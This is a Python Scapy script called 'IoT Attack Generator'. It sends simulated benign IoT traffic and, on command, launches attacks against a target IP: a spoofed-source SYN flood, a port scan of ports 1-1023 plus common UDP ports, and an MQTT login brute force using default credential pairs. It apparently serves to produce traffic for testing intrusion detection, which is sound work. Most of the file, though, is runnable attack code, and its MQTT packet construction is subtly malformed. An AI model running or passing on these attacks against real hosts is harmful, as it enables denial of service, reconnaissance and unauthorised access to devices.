import argparse
import random
import time
from scapy.all import *
from scapy.layers.inet import IP, TCP, UDP
from scapy.layers.dns import DNS, DNSQR

# IoT Protocols
MQTT_PORT = 1883
COAP_PORT = 5683
MODBUS_PORT = 502

def generate_mqtt_traffic(target_ip, count=100):
    """Generate legitimate MQTT traffic"""
    for _ in range(count):
        # Simulate MQTT CONNECT
        send(IP(dst=target_ip)/TCP(dport=MQTT_PORT, flags="S"), verbose=0)
        time.sleep(random.uniform(0.1, 0.5))
        
        # Simulate MQTT PUBLISH
        if random.random() > 0.7:
            payload = f"temp:{random.uniform(18.0, 25.0)}".encode()
            send(IP(dst=target_ip)/TCP(dport=MQTT_PORT, flags="PA")/Raw(load=payload), verbose=0)
            time.sleep(random.uniform(0.2, 1.0))

def generate_mqtt_exploit(target_ip, count=5):
    """Generate MQTT exploit traffic that matches signatures"""
    # MQTT brute force (common credentials)
    credentials = [
        ("admin", "admin"), ("user", "pass"), 
        ("iot", "iot123"), ("root", "toor")
    ]
    
    for _ in range(count):
        # 1. First send a packet with the exact signature pattern
        exploit_pattern = b"MQTTExploit"  # Matches the signature pattern
        send(IP(dst=target_ip)/TCP(dport=MQTT_PORT, flags="PA")/Raw(load=exploit_pattern), verbose=0)
        time.sleep(0.1)
        
        # 2. Then send the actual exploit attempt
        for user, passwd in credentials:
            # Malicious CONNECT with credentials
            payload = f"\x10{chr(len(user)+len(passwd)+14)}\x00\x04MQTT\x04\x02\x00\x3c\x00\x0a{user}\x00\x08{passwd}".encode()
            send(IP(dst=target_ip)/TCP(dport=MQTT_PORT, flags="PA")/Raw(load=payload), verbose=0)
            time.sleep(0.2)
            
            # Add some random MQTT traffic to make it look more realistic
            if random.random() > 0.5:
                topic = f"device/{random.randint(1,100)}/sensor"
                value = random.uniform(18.0, 30.0)
                payload = f"{topic}:{value:.1f}".encode()
                send(IP(dst=target_ip)/TCP(dport=MQTT_PORT, flags="PA")/Raw(load=payload), verbose=0)
                time.sleep(0.1)

def generate_ddos(target_ip):
    """Generate DDoS attack traffic"""
    # SYN flood
    for _ in range(1000):
        src_ip = f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        send(IP(src=src_ip, dst=target_ip)/TCP(dport=random.randint(1,65535), flags="S"), verbose=0)
        time.sleep(0.001)

def generate_portscan(target_ip):
    """Generate port scanning activity"""
    # TCP port scan
    for port in range(1, 1024):
        send(IP(dst=target_ip)/TCP(dport=port, flags="S"), verbose=0)
        time.sleep(0.01)
    
    # UDP port scan
    for port in [53, 67, 68, 123, 161, 162, 1900, 5353]:
        send(IP(dst=target_ip)/UDP(dport=port), verbose=0)
        time.sleep(0.05)

def generate_benign_iot_traffic(target_ip):
    """Generate normal IoT device traffic"""
    protocols = ['mqtt', 'coap', 'http', 'dns']
    protocol = random.choice(protocols)
    
    if protocol == 'mqtt':
        generate_mqtt_traffic(target_ip, count=random.randint(5, 20))
    elif protocol == 'coap':
        # CoAP GET request
        send(IP(dst=target_ip)/UDP(dport=COAP_PORT)/Raw(load=b"\x40\x01\x00\x00"), verbose=0)
    elif protocol == 'http':
        # HTTP GET request
        send(IP(dst=target_ip)/TCP(dport=80, flags="PA")/Raw(load=b"GET /status HTTP/1.1\r\nHost: iot.device\r\n\r\n"), verbose=0)
    elif protocol == 'dns':
        # DNS query
        send(IP(dst=target_ip)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="iot-server.local")), verbose=0)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="IoT Attack Generator")
    parser.add_argument('--attack', choices=['ddos', 'portscan', 'mqtt'], help="Attack type")
    parser.add_argument('--traffic', choices=['normal'], help="Benign traffic type")
    parser.add_argument('--target', default="192.168.0.1", help="Target IP address")
    args = parser.parse_args()
    
    if args.attack == "ddos":
        generate_ddos(args.target)
    elif args.attack == "portscan":
        generate_portscan(args.target)
    elif args.attack == "mqtt":
        generate_mqtt_exploit(args.target)
    elif args.traffic == "normal":
        while True:
            generate_benign_iot_traffic(args.target)
            time.sleep(random.uniform(1.0, 5.0))